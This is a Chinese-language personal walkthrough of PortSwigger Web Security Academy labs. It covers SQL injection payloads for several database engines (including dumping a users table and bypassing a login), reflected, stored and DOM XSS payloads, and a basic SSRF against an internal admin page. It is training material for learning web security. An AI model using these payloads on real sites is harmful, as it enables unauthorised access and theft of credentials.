# SQLI

## https://portswigger\.net/web\-security/sql\-injection/lab\-retrieve\-hidden\-data

找到注入点

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGEyNTMyNGQ5YjhmMzgyMWVkYTkwM2QyMDhjNWE4ZGFfZGQxNzAzZWQ2MzU4YTZkMTQ5NmVmY2Q2YzkxYzBlZTRfSUQ6NzY2ODE0MDQwMTgzNjU3NTcxMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

```Plain Text
https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=
```

当输入单引号时服务器报错，输入双引号或者数字正常返回

由于union联合查询需要列数匹配，所以我们先用order by判断字段数

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGM3OGRmMjAzYTA2NmIxODFjZWI0MDk4NTdkNWE0M2FfNDFlYjJiYTY4YWIyZTNhMmE5ZWM4M2NhNzcwY2YyZWRfSUQ6NzY2ODE0MDc5MzkwMzUwMDU4NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmFkMDhjZGFkOTNmMDU4MTlhYmQ1YWNmMDNiZWE4OWNfYTI5ZTY2ODNmODVkYjViMjI4YzA3MzNmNDZmMWVjNjlfSUQ6NzY2ODE0MDg3NDI4Mjg2MzU5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

直到9时服务器报错，证明有八个字段值

用union select判断回显位置

**这边要注意，union的结果类型要相同**

这边以eshop的Category表为例，这边where条件如果是字符类型，后面union如果是数字型，就会报错

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MTk4MGExYjkxN2FiMTFhZDI1YzM2NTBmN2M0N2EzMGRfZmU5MDc3MmY3ZTJkYTgyMjJjY2VhZWEzMjk0ODFlYjlfSUQ6NzY2ODE0Mjc0MjUxNzc2MzAzNF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

所以判断回显位置的payload应该是

```SQL
https://0ad80089046ed7a28353fd47006600b1.web-security-academy.net/filter?category=' union select '1','2','3','4','5','6','7','8'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZWM5NmRhYTQwMWZiMjY1NmFmZDYwNjNkMDhlNmZiYWVfYzMxYmE5Y2MyZjJmY2Q5YWVhYzgxODUwZGQ3MjVkZTlfSUQ6NzY2ODE0MzA0Njg1MzEzNTMzOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

确定3为回显位置，于是开始确定数据库

这边我一般都是直接database\(\)，但是发现执行不了，以为语句有问题，结果一问ai才知道我给每个靶场都默认mysql数据库了

每个类型的数据库查询数据库名的语法不同

###### 如果后端是 Oracle 数据库

```C++
1' union select '1','2',(SELECT global_name FROM global_name),'4','5','6','7','8' FROM dual--+
```

###### 如果后端是 MySQL数据库

```C++
1' union select '1','2',database(),'4','5','6','7','8'--+
```

###### 如果后端是 Microsoft SQL Server 数据库

```C++
1' union select '1','2',db_name(),'4','5','6','7','8'*--+*
```

###### 如果后端是PostgreSQL

```C++
1' union select '1','2',current_database(),'4','5','6','7','8'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzlhMWI3N2JlYzliY2E4ZGMzN2VjZTQ0YWI3MTBiYzFfNDE3ZjViNGQwNWY4Njk2ODBiZGNhZDUwNzc1NTRmMGVfSUQ6NzY2ODE0NjIyMDI4NDYxMTU1N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这边只有current\_database\(\)正常返回，推断靶场使用的是**PostgreSQL数据库，当前数据库名是“academy\_labs”**

用下面这个payload也能证明

```SQL
https://0a40002704320fb680e50d7300650099.web-security-academy.net/filter?category=1'+union+select+'1','2',version(),'4  ','5','6','7','8'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTllNjE0MWIyNTEzMWJiMDNiODMzMzZlMGQ2OTUzYzdfODU2ODJkMzRhMjhmMGMxZjY5YjlkYjY1ZTkwMGM3YmJfSUQ6NzY2ODIwNDg2ODM4MTQ0NTA2NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)





###### 这边我是想通过看mysql的information\_schema来理解sql注入怎么看一个数据库的所有表名

下一步是看当前数据库中存在什么表，我们就可以借助information\_schema数据库中的tables表来查询

先来看看information\_schema数据库tables表的结构，以查询mysql中的world表名为例

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjAzYjQwNzY5NjdhZDMwY2RkN2E1MDE3NGI2MzhmYjNfYzNjOWViNTc5NDkxNzFjN2ExMDI4NTY2M2EzMDY0ZGJfSUQ6NzY2ODE1MzE0ODAyODczNDY2Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

我们可以看到该表中存在两个字段，一个是TABLE\_SCHEMA存放的所有的数据库名，TABLE\_NAME存放了所有的表名

如果我们要查询world数据库中的所有表名，我们就可以使用下面的语句

```Plain Text
select table_name from information_schema.TABLES where table_schema='world';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDBmZmYxMTk3NTExODdjNTg3MDg0OGFmMjY0MmMxY2NfMTRiZWIwNTdhMmU0YzAyMTNmMjBhNGI1ZjM4YjE5NDZfSUQ6NzY2ODE1NTQzMTA5NzA3NzAwMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

因为只有一个回显位置，所以我们可以使用group\_concat\(\)将查询结构合并为一个字符串

```Plain Text
select GROUP_CONCAT(table_name) from information_schema.TABLES where table_schema='world';
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Njk2ZjlkMmY0NjA0OGI3YTU5MDcxNjlkYzZmZGY0ZjdfNDU2MmQyN2ViMGQ2ZDMyNGJkZmQ1ZDc2MmZhNGRjOTNfSUQ6NzY2ODE1NTE4MDc4MTQyMzg1Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)



###### 但是，注意这题用的是PostgreSQL，跟mysql完全不一样

在 PostgreSQL 中，每一个数据库（Database）都拥有自己独立的一套 `information_schema` 视图。这是它和 MySQL 的一个重大区别。

下面是历尽千辛万苦本地部署的PostgreSQL数据库，创建了users和products表来进行理解

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzQzMWQyYmY4NGNhODExMzJiNzYzM2U5NjczOTZiMWVfYmVhNzZjMjQ4OTJjMjQ5NjE5ODA1Yjc3ZjI3YjM2NjhfSUQ6NzY2ODIxMDM2NDExNDYzNjA1OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

所以相应的我们的payload也要发生改变，不能使用group\_concat了，而要改成STRING\_AGG\(table\_name, ','\)

```Java
1' union select '1','2',STRING_AGG(table_name, ','),'4','5','6','7','8' from information_schema.tables where table_schema='public'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDhlMzFhYzhiMTRjNTJjODUwZDQ4YWYwOGU5ZDkxNGJfNjAzYWE2NDljZGZjYTkyZDJjMTRjNDdmZDMzYTYyMTRfSUQ6NzY2ODIxMTk0MjUxNTg4NzM3Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

我去不早说，当我正在纠结怎么查询表的字段值时，研究发现information\_schema\.columns表中东西更全，包括每张表的名字和每张表的字段名。这边懒得改了，能用就行

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTUwMDljZWVmMTk3NGEzMjNkY2YzODM4NGZjZTc2NDJfODg0MWIwODAwMmJlMjBjZjEzNmZkM2I4ZWE2ZmQyZjZfSUQ6NzY2ODIxMzE4OTg1OTc3MzM2OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

```SQL
https://0a8200fc04ede390802e1cae007000c3.web-security-academy.net/filter?category=1' union select '1','2',STRING_AGG(column_name, ','),'4','5','6','7','8' from information_schema.columns where table_name='products'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzFmNDY1MWIwNWY1NzAyMzMwYWY3OTg1ZGE0NzY3MjNfMWI1NWM4YjczMzNhOGNkNGYyZjRhMGUxZDNjNDk1ZmZfSUQ6NzY2ODIxMzk3MjMzNjQzMDAzNF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)



😂😂😂😂😂😂

玩半天发现这个靶场只需要我们输出隐藏的商品就行了，主要是太卡了可能过程已经解决了但是没记录到

无论如何，通过这关的payload如下

```Plain Text
https://0a8200fc04ede390802e1cae007000c3.web-security-academy.net/filter?category=Accessories' or '1'='1
```





ok，下面这关我得认真看题目要求了

## https://portswigger\.net/web\-security/sql\-injection/lab\-login\-bypass

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzY1YjhjYTQ5Y2YzOWY0MTU2Nzk1MWRhYWIzYmIzN2ZfNGQyYjQwZDMwZmQ0ZTM3OTMxZDhjYzgxNTcwYmIxMDhfSUQ6NzY2ODIxNjU1Mjg2MDMwNjM3MF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

该实验在登录功能中存在一个SQL注入漏洞。

要解决该实验，需要执行一次SQL注入攻击，以管理员（administrator） 用户的身份登录到应用程序。

单引号闭合直接万能密码秒了

```Plain Text
' or '1'='1
```



## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-querying\-database\-version\-oracle

该实验在产品类别过滤功能中存在一个SQL注入漏洞。您可以使用UNION攻击来获取注入查询的结果。

要解决该实验，请显示数据库版本字符串。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MWVlNWU5ZTYxNGE0YjVkZWJmZjljOTMxMTc4NzU5NzFfMGQ5ZTc0MjZkYTYyZDMzNmViZGQxOWFhM2M1OTQ5NjFfSUQ6NzY2ODIxOTY0NjAzNDY0NDE0OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

两个字段

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=N2Q5NjA3YTYyYmMyZDY3NzRjMzMyZDQ5MmVjYmZmZGJfMmEzM2ViZTMzNTJjN2YzMjNmNjY4MzljZTMzNTk5OWJfSUQ6NzY2ODIyMDA5NjYzNjczNDY3M18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

哎，怎么回显不了

我chovy

目标数据库是 Oracle。Oracle 的 `SELECT` 语句有严格规定：必须包含 `FROM` 子句。需要添加 `FROM dual`（dual 是 Oracle 的虚拟表）。同时通常用 `NULL` 占位

所以payload是

```Plain Text
https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?category=' union select null,null from dual--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTRmZGE4ZmFjY2Y3NjUzNDM1YWZlMzhhOTc0Nzc5ZDhfNzUzNDRkYmY5NmM1ZDZhYzc5MzFjZGVlZjhhNjhhMTZfSUQ6NzY2ODIyMTA1MjA1MjgxODkwMl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这样确实有回显了

下面就用Oracle的版本回显语法就行

```Plain Text
https://0a30000f04fb844980680842008f0045.web-security-academy.net/filter?category=
' UNION SELECT banner, NULL FROM v$version--+
```



## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-querying\-database\-version\-mysql\-microsoft

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzU3ZmFhMjY3ZTllOWM0MWU0OTM2MjQ1OTA2ODk1NjJfNTk4YzliNTZjMjFhN2I5NmY2M2M5NjExODRjNDA5NjZfSUQ6NzY2ODIyMTY2NTQ0OTAyMDM3OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YmZjYjYxNjc0MjlmOWRkM2Q4Yzc5MWQ1ZmRjMDQ2NzFfZjJiODgxODFmN2U2OGE4MzdkOTE2NTFlMjU0ZWI3NGNfSUQ6NzY2ODIyMjQ2NjUyMzkyNTczOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这边用1,2就能正常回显了

#### 如果后端是 Microsoft SQL Server

```Plain Text
' UNION SELECT @@version, NULL*--+*
```

或者（如果列数多于2，补齐NULL）：

```Plain Text
' UNION SELECT @@version, NULL, NULL*--+*
```

#### 如果后端是 MySQL

```Plain Text
' UNION SELECT @@version, NULL*--+*
```

或者使用：

```Plain Text
' UNION SELECT version(), NULL*--+*
```

注意：MySQL的注释符也可以是 `#`，但在URL中需要编码为 `%23`。





## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-listing\-database\-contents\-non\-oracle

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmU4Y2JmNjliNzgzNGZmNzU4NmQ1ODZlYzNmZWM3NWRfNjY4ZjJjOWM2Mjc2YWMxZDk3MmM2NDA2NTM5ODY0NjBfSUQ6NzY2ODIyMzE0MjEwNDQ4NTEwMF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

实验：SQL注入攻击——列出非Oracle数据库中的数据库内容

该实验在产品类别过滤功能中存在一个SQL注入漏洞。查询的结果会返回在应用程序的响应中，因此您可以使用UNION攻击从其他表中检索数据。

该应用程序有一个登录功能，并且数据库中包含一个存储用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容，以获取所有用户的用户名和密码。

要解决该实验，请以 `administrator` 用户的身份登录。



看来我们是需要通过产品类别的注入点，获取到账户表，然后用admin账户进行登录

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjA2OTg3MmQ3OGI1ZTcwMGM2ZTA5Mzk0Njk2NDJiNmZfOTI2MmM4YTRhODE4YmIxNmE5YThhZWNmMmVlMTAwNjFfSUQ6NzY2ODIzNzMxMDIxMDgyMTQwN18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

判断出来说两个字段，下面判断回显位置

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjY1Y2M3YWM4NTU5ZGViMmQ5NTc0ZTQwN2I5OTI3MGJfMzQxZGYxMTQxYmVhY2EzZjMyMmY4Y2U0OTcwZjMzNWZfSUQ6NzY2ODIzNzM3MTU2NTE4MjE1NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MzU0NmI2ZGU0NDZjZmEyZWYwOTM3NWNjYTlhN2M0M2VfNWY2YWM5Y2U5OGZmY2FlNDE0OTMwNzc1MTMwZjQwNTNfSUQ6NzY2ODIzNzU1NTI5NjUwNTEzM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzMwNDkzNWFhNjQyMDYxNmVkZjZjMGY0NjNiNjMyNTJfOGQ0YjdkMjg2MDNhNTMxMGUyZGJmZGQ0ZTc4MDcyYzFfSUQ6NzY2ODIzNzY1MjQ2MjY1MjY4MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这边判断还是之前那个数据库，之前用之前的payload查看所有表

```Plain Text
https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?category=' union select '1',STRING_AGG(table_name, ',') from information_schema.columns where table_schema='public'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZDkyZmVlY2UzNWY1Y2E4MDAxZTM5MTI5Nzk0YjdiZWRfNDIxOTcyOWZlYzg5NTU1YzMyMDk5YWY2Y2E2Njg5Y2ZfSUQ6NzY2ODIzODQ4Njg2NjQzMDk0Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

看到可疑目标users\_beemrx表了

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWE2ZjM4MGI2ZDBkOWUxMjcyOWY5MmFmNDIwMjNmYmZfMmZkZjY1MGUxYzAzNGMwZmU3ODUxMjg2Y2U0NWViNzlfSUQ6NzY2ODIzODkwNjM3NDI2MTcxOF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OGQzNDE5NTI5MTVkYWNjOWQ4NTQwZjczMjEzNmI0NjBfNWQwM2RhMmI5NTRjNThjMzUwN2NmZjQ2OTFiZDU0NTJfSUQ6NzY2ODI0MDg1NzAyNzY0NDM3Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

```Plain Text
https://0a16009003709246802a6cc9003200b7.web-security-academy.net/filter?category=' union select username_mebmkr,password_esqokj from users_beemrx--+
```

这边也是成功拿下账号密码，去尝试登录，登录成功



## https://portswigger\.net/web\-security/sql\-injection/examining\-the\-database/lab\-listing\-database\-contents\-oracle

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=N2Y4ZTMzNjVkM2I5YTUzZTEyMjdhNzdkZGFkODI5MzVfZTgzMzAwMGJjYmU3YTY2ZWUyZTVlZmIxNDIyOTljMDJfSUQ6NzY2ODI0MTQ3OTQyNTIzMjE2MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

该实验在产品类别过滤功能中存在一个SQL注入漏洞。查询的结果会返回在应用程序的响应中，因此您可以使用UNION攻击从其他表中检索数据。

该应用程序有一个登录功能，并且数据库中包含一个存储用户名和密码的表。您需要确定该表的名称及其包含的列，然后检索该表的内容，以获取所有用户的用户名和密码。

要解决该实验，请以 administrator 用户的身份登录。



这一关看来需要熟悉oracle语法了

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGRiYzRlZmM2MTdmY2VkOGM1NzYwMzdlYzNhYTAzZWVfYmM3ZWM2MjE0ZTc4ZDM0NDA3ODM1OGMyODQyMDk3MDVfSUQ6NzY2ODI0MjcxODc5MTQwNDUyMF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

还是两个字段

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NzU2MGI5YzY3YTI1NWZlNjIwOGQ5MmEzOGQzODE3MDFfMTJhZTFmMzYzNzUyNWMwMTJjZjk4MTgwN2JjNDk1OGJfSUQ6NzY2ODI0Mjg3MzA4MzQ0ODU0Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

null占位，dual默认表

查看当前数据库的表名

```Plain Text
https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT table_name, NULL FROM user_tables--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTc4MzA0NDc2YmU5ZmJlOTM5M2E0ZDdhOTk1OGJjZGRfYmJkYTk1YTk3MzE2YzVkNmNkMGM2OTBjMzNkYWRjZThfSUQ6NzY2ODI0NjI2MTkyOTI0OTk3Ml8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

表名是USERS\_SAYUJR，下面获取字段名

```SQL
https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT column_name, NULL FROM user_tab_columns WHERE table_name = 'USERS_SAYUJR'--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MDU3MThlZWEzZTljZjU5NWRlZTk2N2U4ZDcwYTJjNzVfMGUwNTY3ZjQ3ODE3NTk2NTk4YzBjZGI4MjM5OWE1N2RfSUQ6NzY2ODI0NjY1NzM5ODYzOTg4NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)



直接select查询

```SQL
https://0a26006c04b90ab580bd0807004e0030.web-security-academy.net/filter?category=' UNION SELECT USERNAME_RZOLHN, PASSWORD_GFUNGG FROM USERS_SAYUJR--+
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NWFmNDQyMDNhMjk5NjlmZGViNmIzMDI0ZTQ3MDkyZGRfN2Y0NTA1YjQ1ZGI5M2I5OWI2MTE0YjQyOTA2YjlkMzdfSUQ6NzY2ODI0NzE2MDUxNzQxMzg0OF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)





# XSS（Cross\-site scripting）

## https://portswigger\.net/web\-security/cross\-site\-scripting/reflected/lab\-html\-context\-nothing\-encoded

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTljYzA4ZWMyYTRkZDg3MDNhMzk0YWQwOTJkYTQwZGRfNzYxYmE4ZGU3YmI0Njc1NjBjM2JlMDc0ZWQ5MWRkM2NfSUQ6NzY2ODI0Nzg2MDU5MzQxMzA2NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDk5NDEwNDFjMzlhNTJlNGI1ZjBlMmY4YzkwYzgzZTJfYTBkZDJkMTJhYWQ2MDk3OGViNzMzMjE4NjVhNjBkMGVfSUQ6NzY2ODI1MDAxNDExODIzNTExNV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

在搜索框输出就完事

```SQL
<script>alert(1)</script>
```





## https://portswigger\.net/web\-security/cross\-site\-scripting/stored/lab\-html\-context\-nothing\-encoded

在评论区输入xss脚本就行

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmJmYzExMWFjNzBmY2ZmYjE3YTQxYzU3M2RhN2EzYTZfOTA5M2QzOTM2Mzk1ZTljN2JkYjg4ZThlNmRhZDYyM2FfSUQ6NzY2ODQ5Mjc0OTMzMDg3NzY3Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)





## https://portswigger\.net/web\-security/cross\-site\-scripting/dom\-based/lab\-document\-write\-sink

实验：使用源 location\.search 在 document\.write 接收器中实现 DOM 型 XSS

本实验在搜索查询跟踪功能中存在一个基于 DOM 的跨站脚本漏洞。它使用了 JavaScript 的 `document.write` 函数，该函数会将数据写入页面。`document.write` 函数被调用时使用了来自 `location.search` 的数据，而你可以通过网站 URL 来控制该数据。

要解决本实验，请执行一次调用 `alert` 函数的跨站脚本攻击。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODlmMDc0NmVkOTBhNGU3YWI2YWFiNzAzYTUxYjU3NjBfNmQ4YmE0ZmMyYmJlY2FlOWFmY2QyODhmY2VjODk2YWRfSUQ6NzY2ODQ5NTY0NTk0MjQzNDc0NV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

打开是一个搜索框，这应该是我们写入脚本的地方

我们查看源代码

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=OTg3Njk4NWM3ODQxM2Y4MTZjNTVkYTEwOTJkM2NlNDFfM2MyNzhiNjM0NWE4Mzc0OWYzZWQwZDNjMzEwMTcwN2JfSUQ6NzY2ODQ5NTc5OTQxMjA1MTIwNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

发现我们输入的语句会与'\<img src="/resources/images/tracker\.gif?searchTerms='连接，然后 document\.write写到页面上

所以我们可以先用"\>闭合掉前面的内容

\<img src="/resources/images/tracker\.gif?searchTerms="\>

然后后面跟xss脚本\<script\>alert\(1\)\</script\>

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTkyYTcxYjQ4MDRlNzFjYTkzZTIwMWRjNGNjZWFjZTBfZWRkYzc3N2E4ZjA3ZWRmYWJmNWNmNmI3OWVlNjEyM2RfSUQ6NzY2ODQ5NzE2ODY5MjU2MzIzM18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

就执行成功了



## https://portswigger\.net/web\-security/cross\-site\-scripting/dom\-based/lab\-innerhtml\-sink

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzgwYTI5ZTA5OGEyYmJkYTIxMmIxZTJiMWUxMDU1ZWRfYzVhNWM2Y2QyN2JlY2E2MTI1YTJlMmU3MGY1NzQxZmFfSUQ6NzY2ODUwMTc0Nzc1Njc2NDM2M18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

还是一个搜索框，直接看源代码

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YTJlN2JhYzY0NjBhYWRlZDJmY2NlMDU4YzU3YjdhOTRfZGYwYzM1M2I5YWFmM2IwOWExMGQzN2YyNTczZDFlOTdfSUQ6NzY2ODUwMjY4NDU1NTMxNjQ5OV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

`document.write` 和 `innerHTML` 都是“写 HTML”的接口，不是“执行 JS”的接口。

直接输入

```SQL
<img src=x onerror=alert(1)>
```



## https://portswigger\.net/web\-security/cross\-site\-scripting/dom\-based/lab\-jquery\-href\-attribute\-sink

### 第一步：看清 lab 标题

DOM XSS in jQuery anchor href attribute sink using location\.search source

这个标题已经告诉了我们一切：

- DOM XSS — 不是 Stored XSS

- jQuery anchor href attribute sink — 用 jQuery 设置 \<a\> 的 href 属性

- location\.search source — 数据来源是 URL 查询参数

### 第二步：找到漏洞代码

在 /feedback 页面底部有这段 JavaScript：

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZmNjZTkxMTJlYWYyZTg3ZDQ1ZDBlNDE2NGIwZDNjZDZfMDk5MjBlNWNhOTQwMTNiOGEyNTA3Y2RmMDFmZDEwMzJfSUQ6NzY2ODUzMzk4OTY1NzIwMTg5NF8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

#### 关键点：

- window\.location\.search 取 URL 中 ? 后面的部分

- URLSearchParams 解析出 returnPath 参数的值

- $\('\#backLink'\)\.attr\("href", value\) 把值直接塞进 \<a\> 的 href 属性

### 第三步：为什么这样能 XSS

\<a\> 标签的 href 支持 javascript: 伪协议。当你设置：

\<a href="javascript:alert\(document\.cookie\)"\>Back\</a\>

用户点击这个链接时，浏览器就会执行 javascript: 后面的代码。

### 第四步：构造 payload

直接访问：

/feedback?returnPath=javascript:alert\(document\.cookie\)

页面加载后，Back 链接变成：

\<a id="backLink" href="javascript:alert\(document\.cookie\)"\>Back\</a\>

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2RhNWJiMTBhNDk1NzFhMjNjMDBlMjhkMDU2MTNlYWVfZGUyNmNlZmQ5YzU1NGJhYzU2NDA3ZTI5YTU0N2E1YTlfSUQ6NzY2ODUzNDUwNzc5MTgxMzkxOV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NjgyZjc5NGY0MjYzNmZlOTRkNmNkZjZkOGU5YTUxMThfMWY2N2RiY2Y5YjYyOTZjZWQzMzg1M2EzMjgxOWNlOTNfSUQ6NzY2ODUzNDU2OTA3NTI2NDQ1N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)



# **Server\-side request forgery \(SSRF\)**

## **Lab: Basic SSRF against the local server**

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTkzOGQxNzMxZTdhYzViYWE1OTk0ZTE4MTZhZTI3MjVfMTRhMDU3ZWRlYTgwYWI2OWMxNjQ2OTAwN2Y3NjU3OTZfSUQ6NzY3MDA0NjQ4MTAzNDA3MTAwNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

本实验存在库存查询功能，该功能会从内部系统拉取数据。 要完成实验，请修改库存查询的 URL，访问位于 `http://localhost/admin` 的管理后台页面，并删除用户 `carlos`。

每个产品他有个查库存的功能

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MGUwNDc1ZmJhZTg0MjZhMThlMDUzZTkzZmFmMGZjYWNfYjk0MDFjNWU4OTcwZDAwNmQ5ZTVkMzQxMzNjZGE0MjJfSUQ6NzY3MDA0ODg3NTczNDYxNzI5N18xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NGQ3NDFkN2VmNTFhMWI0MWQxN2Q1OGU2MTczMDliMmFfZTMyOWQyYTdkMWUxODdjNmJmMThlM2Y5M2I5YmU5MmFfSUQ6NzY3MDA0OTQ2MDMzNjI0OTgyNl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

抓包可以看到服务器主动去请求一个接口。我们尝试给他改成本地的`http://localhost/admin` 的管理后台页面

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NTZjMzFhMjUzMDUxYmIxMTYyZTgzNWZiNDQ4MTNiZTZfOWU1OTc3YjhiMWZiZWM0NDZhMjA4NzUyODRhMjk4ODlfSUQ6NzY3MDA0OTgxMzIzNjM3MDM4Nl8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

这边就能显示该页面，需要注意的是直接点击delete（这边是做好了写的笔记，所有题目要求的用户已经用正确方法删除了）他会出现报错说管理员接口需要登录管理员账号才能使用

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZGJlMmE5YmFlMzAzZjFhYzkyMzBmYjIzMjYzZjcyMTVfMTIwMDkwMGMwODQ3ODQ1NDBhNGMzMGNkMjkyZGRiY2JfSUQ6NzY3MDA1MDE5MjY4Mzc0ODU5MV8xNzkzOTQzOTE2OjE3OTQwMzAzMTZfVjM)

